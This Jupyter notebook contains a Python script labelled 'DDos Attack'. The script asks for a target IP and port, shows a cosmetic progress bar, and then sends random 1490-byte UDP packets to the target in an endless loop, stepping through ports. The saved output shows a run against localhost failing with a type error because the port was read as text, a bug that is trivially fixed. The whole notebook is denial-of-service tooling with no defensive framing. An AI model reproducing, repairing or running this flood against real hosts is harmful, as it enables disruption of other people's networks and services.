{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "IP Target : 127.0.0.1\n",
      "Port       : 8080\n",
      "[                    ] 0% \n",
      "[=====               ] 25%\n",
      "[==========          ] 50%\n",
      "[===============     ] 75%\n",
      "[====================] 100%\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "an integer is required (got type str)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-11-84c4e498a1fe>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     37\u001b[0m \u001b[0msent\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;36m0\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     38\u001b[0m \u001b[1;32mwhile\u001b[0m \u001b[1;32mTrue\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 39\u001b[1;33m      \u001b[0msock\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msendto\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mbytes\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m(\u001b[0m\u001b[0mip\u001b[0m\u001b[1;33m,\u001b[0m\u001b[0mport\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     40\u001b[0m      \u001b[0msent\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0msent\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     41\u001b[0m      \u001b[0mport\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mport\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mTypeError\u001b[0m: an integer is required (got type str)"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import os\n",
    "import time\n",
    "import socket\n",
    "import random\n",
    "#Code Time\n",
    "from datetime import datetime\n",
    "now = datetime.now()\n",
    "hour = now.hour\n",
    "minute = now.minute\n",
    "day = now.day\n",
    "month = now.month\n",
    "year = now.year\n",
    "\n",
    "\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "bytes = random._urandom(1490)\n",
    "os.system(\"clear\")\n",
    "os.system(\"figlet DDos Attack\")\n",
    "\n",
    "\n",
    "ip = input(\"IP Target : \")\n",
    "port = input(\"Port       : \")\n",
    "\n",
    "os.system(\"clear\")\n",
    "os.system(\"figlet Attack Starting\")\n",
    "print(\"[                    ] 0% \")\n",
    "time.sleep(5)\n",
    "print(\"[=====               ] 25%\")\n",
    "time.sleep(5)\n",
    "print(\"[==========          ] 50%\")\n",
    "time.sleep(5)\n",
    "print(\"[===============     ] 75%\")\n",
    "time.sleep(5)\n",
    "print(\"[====================] 100%\")\n",
    "time.sleep(3)\n",
    "sent = 0\n",
    "while True:\n",
    "     sock.sendto(bytes, (ip,port))\n",
    "     sent = sent + 1\n",
    "     port = port + 1\n",
    "     print(\"Sent  packet\")\n",
    "     if port == 65534:\n",
    "       port = 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
